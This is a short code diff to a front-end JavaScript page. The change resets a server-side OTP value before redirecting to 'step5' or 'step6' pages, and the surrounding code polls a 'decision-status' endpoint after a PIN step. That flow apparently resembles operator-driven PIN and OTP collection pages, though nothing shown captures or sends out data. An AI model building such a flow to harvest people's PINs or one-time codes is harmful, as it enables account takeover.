@@ -77,12 +77,24 @@ if (localStorage.getItem("fromPin") === "yes") {
             console.log("OTP:", otpData);
 
             if (otpData.otp === 5) {
-                window.location.href = "step5.html";
-            }
+    await fetch("/set-otp", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ otp: null })
+    });
+
+    window.location.href = "step5.html";
+}
 
             if (otpData.otp === 6) {
-                window.location.href = "step6.html";
-            }
+    await fetch("/set-otp", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ otp: null })
+    });
+
+    window.location.href = "step6.html";
+}
 
             const decisionRes = await fetch("/decision-status?nocache=" + Date.now());
             const decisionData = await decisionRes.json();
